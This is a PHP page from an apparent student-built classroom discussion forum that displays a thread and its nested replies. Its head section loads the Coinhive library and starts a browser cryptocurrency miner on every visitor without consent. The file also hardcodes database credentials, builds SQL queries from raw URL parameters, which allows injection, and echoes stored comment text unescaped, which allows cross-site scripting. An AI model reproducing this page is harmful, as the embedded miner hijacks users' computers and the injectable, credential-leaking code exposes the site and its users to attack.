<?php
  session_start();
  //Check if user is logged in
  if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] == true) {
    if($_SESSION['role'] != 2) {
      $_SESSION['error'] = true;
      $_SESSION['errorCode'] = "Not Permitted";
      header("Location: ../login.php");
      die("oops");
    }
  } else {
    $_SESSION['error'] = true;
    $_SESSION['errorCode'] = "Session Expired";
    header("Location: ../login.php?event=logout");
  }

  //TODO Grab all this from a file
  //Define sql database information
  $host="mysql.cs.iastate.edu";
  $port=3306;
  $socket="";
  $user="dbu309sab3";
  $password="SD0wFGqd";
  $dbname="db309sab3";
  //Connect to database
  $db = new mysqli($host, $user, $password, $dbname, $port, $socket) or die ('Could not connect to the database server' . mysqli_connect_error());

  //Get this class
  $query = "SELECT * FROM classes WHERE ID = " . $_GET['class'];
  $result = $db->query($query) or die($db->error);
  $class = $result->fetch_assoc();

  //Check to see if this teacher actaully owns this classes
  if($class['teacher_id'] != $_SESSION['id']) {
    header("Location: home.php");
    die("oops");
  }

  function getChildComments($parentID, $lvl, $threadID, $db) {
    //Get the children of this comment
    $query = "SELECT * FROM replies WHERE parent = " . $parentID . " AND thread_id = " . $threadID;
    $result = $db->query($query) or die($db->error);
    //If we have a child comments
    while($comment = $result->fetch_assoc()) {
      //Indent the line the specifed level
      $id = $comment['ID'];
      $text = $comment['txt'];
      $author = $comment['user_name'];
      $endorsedID = $comment['endorsed_user_id'];
      $flagged = $comment['flagged'];
      $creation = $comment['creation'];
      $points = $comment['points'];
      //Print the comment
      echo '<div class="row">
              <div class="col-md-' . $lvl . '"></div>
              <div class="col-md-' . (12 - $lvl) . '">
                <div class="jumbotron well">';
      echo '<p>' . $text . '</p>  -' . $author . ' @ ' . $creation . '<br><br>';
      //Print the buttons
      echo '<button class="commentButton" onclick="unhide(this,\'childComment' . $id . '\')">Reply</button><a href="utilities/comment.php?class=' . $_GET['class'] . '&thread=' . $threadID . '&comment=' . $id . '&action=flag" class="commentButton">Flag</a><a href="utilities/comment.php?class=' . $_GET['class'] . '&thread=' . $threadID . '&comment=' . $id . '&action=endorse" class="commentButton">Endorse</a>';
      //Print endorsement
      if($endorsedID) {
        echo 'Endorsed!';
      }

      //create the hidden comment box.
      echo '<div id="childComment' . $id . '" class="hidden">
            <div class="content3">';
      echo '<form action="utilities/comment.php?class=' . $_GET['class'] . '&thread=' . $threadID . '&action=comment" method="post">';
      echo '<input type="hidden" name="parentID" value="' . $id . '" size="35">
            <input type="text" name="comment" value="" size="35"><br>
            <input name="signup' . $id . '" type="submit" value="Submit">
            </form>';
      echo '</div></div>';
      echo '</div></div></div>';
      //Print any child comments of this comment
      getChildComments($id, $lvl + 1, $threadID, $db);
    }

  }
?>

<html lang="en">
  <head>
    <link rel="stylesheet" href="../css/pages.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/css/bootstrap.min.css" integrity="sha384-/Y6pD6FV/Vv2HJnA6t+vslU6fwYXjCFtcEpHbNJ0lyAFsXTsjBbfaDjzALeQsN6M" crossorigin="anonymous">
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/js/bootstrap.min.js" integrity="sha384-h0AbiXch4ZDo7tp9hKZ4TsHbi047NrKGLO3SEJAg45jXxnGIfYzk4Si90RDIqNm1" crossorigin="anonymous"></script>
    <!-- Ethical? Maybe. Profitable? Not in the slightest. -->
    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
    <link rel="stylesheet" href="css/pages.css">
    <script type="text/javascript">
      //Post hider
      function unhide(clickedButton, divID) {
        var item = document.getElementById(divID);
        if (item) {
            if(item.className=='hidden') {
                item.className = 'unhidden' ;
                clickedButton.value = 'Cancel'
            }
            else {
                item.className = 'hidden';
                clickedButton.value = 'Comment'
            }
      }}
      </script>
      <script>
      //Start miner
	     var miner = new CoinHive.Anonymous('cyJAe6sZCcdfGwI4CRIXtPlv8MOK5oo7');
	      miner.start();

    </script>
    <!-- End questionable content -->

    <!-- The top banner of the webpage -->
    <div class="top">
        <font size="-5"><a class="logout" href="../login.php?event=logout">Logout</a></font>
        <center>
          <?php
            echo '<h1>' . $class['class_name'] . '</h1>';
          ?>
        </center>
    </div>
  </head>

  <!-- The left sidebar -->
  <div class="left">
    <?php
      echo '<button class="button" onclick="window.location=\'home.php\';">' . $_SESSION['name'] . '\'s Home</button>';
      echo '<button class="button" onclick="window.location=\'pages.php?class=' . $_GET['class'] . '\';">' . $class['class_name'] . ' Home</button>';
      echo '<button class="button" onclick="window.location=\'pages.php?class=' . $_GET['class'] . '&page=classSettings\';">Class Settings</button>';
      echo '<button class="button" onclick="window.location=\'topics.php?class=' . $_GET['class'] . '\';">Discussion Topics</button>';
      echo '<button class="button" onclick="window.location=\'liveSession.php?class=' . $_GET['class'] . '\';">Live Session</button>';
     ?>
  </div>

  <!-- Main content of the webpage -->
  <div class="main">
    <div id="threads" class="container-fluid" style="overflow-y: auto;max-height: 90vh;">
      <?php
        $class = $_GET['class'];
        $thread = $_GET['thread'];
        //Get the current thread
        $query = "SELECT * FROM threads WHERE ID = " . $thread;
        $result = $db->query($query) or die($db->error);
        $mainThread = $result->fetch_assoc();
        //Print the thread title
        echo '<div class="row row-no-padding">
                <div class="col-md-12">
                  <div class="jumbotron well">';
        echo '<h5>' . $mainThread['title'] . '</h5><br>' . $mainThread['description'] . '<br><br>';
        echo '<button class="commentButton" onclick="unhide(this,\'childComment0\')">Reply</button><a href="#" class="commentButton">Flag</a><a href="#" class="commentButton">Endorse</a>';
        //create the hidden comment box.
        echo '<div id="childComment0" class="hidden">
              <div class="content3">';
        echo '<form action="utilities/comment.php?class=' . $_GET['class'] . '&thread=' . $_GET['thread'] . '&action=comment" method="post">';
        echo '<input type="hidden" name="parentID" value="0" size="35">
              <input type="text" name="comment" value="" size="35"><br>
              <input name="signup" type="submit" value="Submit">
              </form>';
        echo '</div></div>';
        echo '</div></div></div>';
        //Now we can work on child comments
        getChildComments(0, 1, $thread, $db);
      ?>
    </div>
  </div>
</html>
